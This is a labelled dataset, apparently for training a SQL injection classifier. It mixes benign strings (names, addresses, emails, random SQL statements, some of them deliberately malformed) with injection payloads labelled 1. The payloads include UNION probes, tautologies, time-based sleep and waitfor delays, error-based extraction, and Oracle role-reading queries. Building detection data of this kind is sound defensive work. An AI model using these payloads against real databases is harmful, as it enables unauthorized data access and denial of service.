1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp;1
maracaja@telogis.ad;0
limit;1
1   )    )    union all select null,null,null,null,null,null#;1
6,11E+15;0
"1%""  )   union all select null,null,null,null,null--";1
flo3a;0
1%' union all select null,null#;1
1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy;1
1' where 7882  =  7882 and 6663  =  4524--;1
1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1";1
-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--;1
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1";1
SELECT * FROM doll WHERE paragraph IN  ( SELECT seems FROM like ) ;0
-8071   )    )    or 9160  =  4253;1
SELECT * FROM railroad WHERE stepped  BETWEEN 10 AND 20;0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537;1
"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat";1
modorrillo;0
-5245' or elt  (  1032  =  1032,3623  )   and 'qfvo'  =  'qfvo;1
brgmann saura;0
SELECT Orders.platesrID, Employees.sister, Employees.round FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.inID ORDER BY Orders.aliveID;0
1%'  )   or sleep  (  5  )   and   (  '%'  =  ';1
SELECT alive ( s )  FROM usually SELECT exactly FROM arm;0
UPDATE shop SET must = 'decide'WHERE cloth = 'shut';0
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --";1
SELECT * FROM teacher WHERE half IN  ( SELECT balance FROM prepare ) ;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i;1
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #;1
"1""  )   as vzdq where 3160  =  3160";1
select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #;1
SELECT * FROM lamp WHERE son LIKE '%ourselves%';0
"SELECT quantity, description FROM logs WHERE created_at = 'active';";0
eial;0
1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--;1
fresno de torote;0
65781436x;0
1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT recall FROM separate UNION SELECT heavy FROM dear ORDER BY nearby;0
"UPDATE products SET price = 'active' WHERE created_at = 'Sample text';";0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  ';1
SELECT * FROM group ORDER BY putting;0
4,89E+14;0
UPDATE bag SET bottom =  'pie', City =  'yet' WHERE mixture =  heading;0
42836631m;0
-8716'  )   where 5523  =  5523 or 3686  =  8485--;1
SELECT swam ( s )  FROM diagram UNION ALL;0
3702;0
INSERT INTO roll ( silence, care, favorite, select, pink, save )  VALUES  ( 'smallest', 'driven'. coming', 'tune', 'hope', 'tell', 'part' )  ;0
-1630' union all select 1971,1971--;1
"SELECT email FROM logs WHERE user_id = 'john@example.com';";0
9,54E+15;0
"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""fuus"" like ""fuus";1
SELECT review ( s )  FROM powder UNION ALL;0
aguinaga achutegui;0
calle limones, 60,;0
a7av5nc6;0
"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#";1
nadav6;0
SELECT cool FROM repeat UNION SELECT become FROM married ORDER BY visit;0
1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +';1
hi9dra;0
select count  (  *  )   from generate_series  (  1,5000000  )  --;1
select * from users where id  =  1. <@ union select 1,version  (    )   -- 1;1
9mbaicin;0
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden';0
1  )   as bhdj where 4472  =  4472;1
1366;0
shanir;0
SELECT * FROM equipment  WHERE horse = eaten;0
1 where 4787  =  4787;1
SELECT * FROM express;0
6,73E+15;0
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY;0
lindt38;0
"-8382""   )    )    order by 1--";1
SELECT * FROM pleasure WHERE dust IN  ( 'desk', 'paragraph', 'famous' )  ;0
1'  )   as bzem where 4240  =  4240;1
-7999  )   or 8422  =  1336;1
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --;1
SELECT AVG ( pony ) FROM lips SELECT SUM ( older ) ;0
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1";1
SELECT * FROM lead WHERE grandmother = 'zipper'  OR brought = 'having';0
1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084;1
eccles@aspirantes.gh;0
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1;1
SELECT * FROM railroad WHERE city = 'pencil' FETCH FIRST 3 ROWS ONLY;0
"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf";1
-8234'   )    )     )   or 9323  =  9323#;1
abi;0
"1""   )    )    rlike sleep  (  5  )  #";1
-3136%'  )   or 3400  =  6002;1
c/ barriada nueva andalucia, 79, 5?f;0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  ';1
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ;0
1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'sstt'  =  'sstt;1
"-2987""  )   as iyob where 7827  =  7827 or   (  8459  =  8459  )  *4906--";1
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh;1
1'||  (  select 'wcad' from dual where 4262  =  4262 and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
SELECT over ( s )  FROM slipped SELECT couple FROM area;0
padiernos;0
1   )    )    as bvij where 7913  =  7913;1
1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'llfp'  =  'llfp;1
1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  ';1
sienes;0
-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#;1
alcoholado sabaters;0
"INSERT INTO products (created_at, id) VALUES ('pending', 'pending');";0
-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf;1
1'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive;0
-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ';1
50422961s;0
SELECT * FROM local ORDER BY pet;0
"SELECT description FROM sessions WHERE created_at = '2023-01-01';";0
-9212 or 1026  =  7967#;1
"1"" where 7110  =  7110";1
dey;0
fisgar;0
/;1
mairena;0
select sleep  (  5  )   and   (  1435  =  1435;1
"));waitfor delay '0:0:5'--";1
SELECT AVG ( classroom ) FROM reach SELECT SUM ( due ) ;0
calle del derecho 17,;0
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1";1
1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz;1
"-3737%"" union all select 4452,4452,4452#";1
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist;0
1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1";1
18567;0
28737;0
moneyba, 114;0
61089913g;0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  ';1
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""pqsp""  =  ""pqsp";1
end--;1
fermentadora;0
1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||';1
rudie@deuxmanagement.jo;0
"UPDATE users SET email = 'user123' WHERE id = 'john@example.com';";0
cabarrs zafn;0
"1""   )    )    as hzcq where 9250  =  9250 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY;0
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps";1
SELECT * FROM  ( SELECT blew FROM method ) ;0
admin') or '1'='1'#;1
SELECT DISTINCT unless FROM door;0
"SELECT user_id FROM products WHERE email = 'Sample text';";0
ligurs;0
SELECT * FROM  ( SELECT religious FROM coast ) ;0
1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'wwwb'  =  'wwwb;1
"1%"" union all select null,null,null#";1
5348;0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi;1
gaviota 13;0
50174;0
select sleep  (  5  ) ;1
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) ;0
9270;0
"UPDATE orders SET status = 'john@example.com' WHERE name = 456;";0
arima@hormigon-impreso.nu;0
1193;0
atuesta venturi;0
"SELECT status, id FROM sessions WHERE id = 'active';";0
SELECT * FROM shout WHERE flame BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM sign WHERE begun BETWEEN various09/01/1996steel AND into15/31/1996instance;0
UNION ALL SELECT;1
-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#;1
1  )   where 1079  =  1079;1
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making';0
SELECT * FROM newspaper WHERE made NOT LIKE 'common%';0
1'  )   as oknw where 8777  =  8777;1
1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --;1
SELECT mice ( s FROM truth RIGHT JOIN;0
select case when 1613  =  2937 then 1 else null end--;1
stiven;0
dekeyser@creacionwebs.bn;0
21208;0
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt;1
1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #;1
SELECT * FROM current ORDER BY planned, behavior;0
SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.westernID ORDER BY Orders.medicineID;0
"1""   )    )     )   and 5429  =  9596";1
"1%""   )    )     )   or sleep  (  5  )   and    (    (     (  ""%""  =  """;1
"SELECT id, name, price FROM sessions WHERE name = 123;";0
or true--;1
barrenechea sadurn;0
-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--;1
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh";1
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq;1
admin'  )   or   (  '1'  =  '1'#;1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  ';1
select * from information_schema.tables--;1
frades;0
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
"1"" union all select null,null,null,null#";1
"1""   )    )    or sleep  (  5  )  #";1
SELECT AVG ( happen ) FROM unusual;0
"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --";1
-3781  )   union all select 3916,3916,3916--;1
SELECT * FROM cup ORDER BY tobacco, several;0
werling;0
1450;0
-1219'  )   or 5592  =  4835;1
1%'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ';1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu";1
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1";1
gerino;0
37655511a;0
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7;1
UNION ALL SELECT 1,2,3,4,5;1
"DELETE FROM employees WHERE quantity = 'user123';";0
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm;1
tilden.auerbach4@cochesautomaticos.ru;0
8,12E+15;0
SELECT * FROM seen WHERE listen BETWEEN '1996-07-01' AND '1996-07-31';0
"INSERT INTO sessions (name, quantity) VALUES ('john@example.com', 456);";0
compte;0
SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ;0
9nte0uer3o;0
SELECT castle,skin FROM double WHERE root = 'duty' UNION SELECT water, studying FROM nation;0
"-1184""   )    )     )   union all select 1482--";1
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte;1
select * from users where id  =  1 *  (    )   union select null,@@VERSION -- 1;1
SELECT far ( s )  FROM fierce FULL OUTER JOIN;0
11800455y;0
1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939;1
SELECT COUNT ( him ) FROM doing;0
2,47E+15;0
SELECT scientist ( s )  FROM shop SELECT author ( s ) ;0
SELECT * FROM himself WHERE needed BETWEEN '1996-07-01' AND '1996-07-31';0
"1""  )   where 9285  =  9285 and 8506  =  8343#";1
" select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1";1
SELECT * FROM draw WHERE longer NOT LIKE '[whose]%';0
INSERT INTO down  ( myself, important, coal )  VALUES  ( 'while', 'scientific', 'fourth' )  ;0
SELECT MIN ( own )  AS window FROM had;0
1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ;1
"-8772%""  )   union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--";1
-3084%'   )    )    order by 1--;1
ollo;0
SELECT COUNT ( rabbitID ) FROM forth;0
1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --;1
SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp;0
FROM  ( SELECT DISTINCT term FROM river ) ;0
1'||  (  select 'yyil' from dual where 3121  =  3121;1
andrs castanyer;0
1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--;1
"SELECT name FROM logs WHERE status = 'pending';";0
"INSERT INTO employees (user_id, price, status) VALUES ('Sample text', 'Sample text', 'Sample text');";0
"DELETE FROM logs WHERE id = 'Sample text';";0
-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#;1
-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#;1
1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct;1
select sleep  (  5  )   and    (    (   3404  =  3404;1
c/ meson de jativa, 109 10-a;0
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
muro de aguas;0
7576;0
frerichs@underdog.as;0
avellano;0
SELECT * FROM remove WHERE indicate BETWEEN copper09/01/1996them AND easier15/31/1996couple;0
SELECT but ( s ) FROM cake INNER JOIN;0
roni;0
SELECT byID AS ID, alphabet AS cover FROM jet;0
desfacedora;0
select * from users where id  =  1 or   (  +  )    =  1 union select 1,@@VERSION -- 1;1
ibero saborit;0
1'  )   and 2305  =  1934;1
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl";1
